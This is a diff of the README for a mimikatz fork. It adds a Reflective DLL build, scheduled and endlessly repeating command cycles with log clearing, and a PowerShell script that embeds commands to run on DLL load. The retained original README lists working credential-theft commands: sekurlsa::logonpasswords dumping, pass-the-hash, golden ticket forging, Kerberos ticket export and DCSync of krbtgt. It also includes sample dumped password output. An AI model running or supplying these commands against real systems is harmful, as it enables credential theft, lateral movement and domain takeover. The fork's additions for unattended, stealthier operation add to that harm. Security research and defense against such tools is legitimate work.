@@ -3,7 +3,42 @@
 **`mimikatz`** with 'ReflectiveDLL' build target made by Yegor Bayev @kodx.
 Microsoft Visual Studio 2013 required.
 
+Modifications:
+
+## standart
+
+**log** - got new option `/clear`, to clear log file.
+example:
+`"log %TEMP%\mimikatz.log /clear"`
+will clear log file on call. Using log file path is mandatory.
+
+**waitfor** - wait until specified time of day in 24h format "hh MM", where is hh is hour and MM is minute, if this time has passed, wait for another day.
+example:
+`"waitfor 12 00"`
+will wait for 12:00 of the current day.
+
+**cycle** - repeat command list endlessly.
+example:
+
+`cycle "log %TEMP%\mimikatz.log /clear" version localtime "waitfor 12 00"`
+
+will write output of commands `version` and `localtime` to `%TEMP%\mimikatz.log` with overwrite(clear contents on write) every day at 12:00 o'clock.
+
+## Reflective DLL version
+
+To write command list into dll use PowerShell script `posh_binstringbuilder.ps1` from `testbuild` directory.
+
+`$SourceBinary` - path to source dll
+
+`$OutputBinary` - path to output dll
+
+`$TargetStr` - command list to execute on start
+
+
+
 Next is original README.
+
+---
 
 # mimikatz
 
@@ -43,18 +78,20 @@ SID               : S-1-5-21-1982681256-1210654043-1600862990-1000
          * Password : waza1234/
 ...
 ```
+
 But that's not all! `Crypto`, `Terminal Server`, `Events`, ... lots of informations in the GitHub Wiki https://github.com/gentilkiwi/mimikatz/wiki or on http://blog.gentilkiwi.com (in French, _yes_).
 
 If you don't want to build it, binaries are availables on https://github.com/gentilkiwi/mimikatz/releases
 
-
 ## Quick usage
+
 ```
 log
 privilege::debug
 ```
 
 ### sekurlsa
+
 ```
 sekurlsa::logonpasswords
 sekurlsa::tickets /export
@@ -63,6 +100,7 @@ sekurlsa::pth /user:Administrateur /domain:winxp /ntlm:f193d757b4d487ab7e5a3743f
 ```
 
 ### kerberos
+
 ```
 kerberos::list /export
 kerberos::ptt c:\chocolate.kirbi
@@ -71,6 +109,7 @@ kerberos::golden /admin:administrateur /domain:chocolate.local /sid:S-1-5-21-130
 ```
 
 ### crypto
+
 ```
 crypto::capi
 crypto::cng
@@ -83,6 +122,7 @@ crypto::keys /machine /export
 ```
 
 ### vault & lsadump
+
 ```
 vault::cred
 vault::list
@@ -99,37 +139,45 @@ lsadump::dcsync /user:domain\krbtgt /domain:lab.local
 ```
 
 ## Build
+
 `mimikatz` is in the form of a Visual Studio Solution and a WinDDK driver (optional for main operations), so prerequisites are:
-* for `mimikatz` and `mimilib` : Visual Studio 2010, 2012 or 2013 for Desktop (**2013 Express for Desktop is free and supports x86 & x64** - http://www.microsoft.com/download/details.aspx?id=44914)
-* _for `mimikatz driver`, `mimilove` (and `ddk2003` platform) : Windows Driver Kit **7.1** (WinDDK) - http://www.microsoft.com/download/details.aspx?id=11800_
+
+- for `mimikatz` and `mimilib` : Visual Studio 2010, 2012 or 2013 for Desktop (**2013 Express for Desktop is free and supports x86 & x64** - http://www.microsoft.com/download/details.aspx?id=44914)
+- _for `mimikatz driver`, `mimilove` (and `ddk2003` platform) : Windows Driver Kit **7.1** (WinDDK) - http://www.microsoft.com/download/details.aspx?id=11800_
 
 `mimikatz` uses `SVN` for source control, but is now available with `GIT` too!
 You can use any tools you want to sync, even incorporated `GIT` in Visual Studio 2013 =)
 
 ### Synchronize!
-* GIT URL is  : https://github.com/gentilkiwi/mimikatz.git
-* SVN URL is  : https://github.com/gentilkiwi/mimikatz/trunk
-* ZIP file is : https://github.com/gentilkiwi/mimikatz/archive/master.zip
+
+- GIT URL is  : https://github.com/gentilkiwi/mimikatz.git
+- SVN URL is  : https://github.com/gentilkiwi/mimikatz/trunk
+- ZIP file is : https://github.com/gentilkiwi/mimikatz/archive/master.zip
 
 ### Build the solution
-* After opening the solution, `Build` / `Build Solution` (you can change architecture)
-* `mimikatz` is now built and ready to be used! (`Win32` / `x64`)
-  * you can have error `MSB3073` about `_build_.cmd` and `mimidrv`, it's because the driver cannot be build without Windows Driver Kit **7.1** (WinDDK), but `mimikatz` and `mimilib` are OK.
+
+- After opening the solution, `Build` / `Build Solution` (you can change architecture)
+- `mimikatz` is now built and ready to be used! (`Win32` / `x64`)
+  - you can have error `MSB3073` about `_build_.cmd` and `mimidrv`, it's because the driver cannot be build without Windows Driver Kit **7.1** (WinDDK), but `mimikatz` and `mimilib` are OK.
 
 ### ddk2003
+
 With this optional MSBuild platform, you can use the WinDDK build tools, and the default `msvcrt` runtime (smaller binaries, no dependencies)
 
 For this optional platform, Windows Driver Kit **7.1** (WinDDK) - http://www.microsoft.com/download/details.aspx?id=11800 and Visual Studio **2010** are mandatory, even if you plan to use Visual Studio 2012 or 2013 after.
 
 Follow instructions:
-* http://blog.gentilkiwi.com/programmation/executables-runtime-defaut-systeme
-* _http://blog.gentilkiwi.com/cryptographie/api-systemfunction-windows#winheader_
+
+- http://blog.gentilkiwi.com/programmation/executables-runtime-defaut-systeme
+- _http://blog.gentilkiwi.com/cryptographie/api-systemfunction-windows#winheader_
 
 ## Licence
+
 CC BY 4.0 licence - https://creativecommons.org/licenses/by/4.0/
 
 ## Author
-* Benjamin DELPY `gentilkiwi`, you can contact me on Twitter ( @gentilkiwi ) or by mail ( benjamin [at] gentilkiwi.com )
-* DCSync function in `lsadump` module was co-writed with Vincent LE TOUX, you can contact him by mail ( vincent.letoux [at] gmail.com ) or visit his website ( http://www.mysmartlogon.com )
+
+- Benjamin DELPY `gentilkiwi`, you can contact me on Twitter ( @gentilkiwi ) or by mail ( benjamin [at] gentilkiwi.com )
+- DCSync function in `lsadump` module was co-writed with Vincent LE TOUX, you can contact him by mail ( vincent.letoux [at] gmail.com ) or visit his website ( http://www.mysmartlogon.com )
 
 This is a **personal** development, please respect its philosophy and don't use it for bad things!
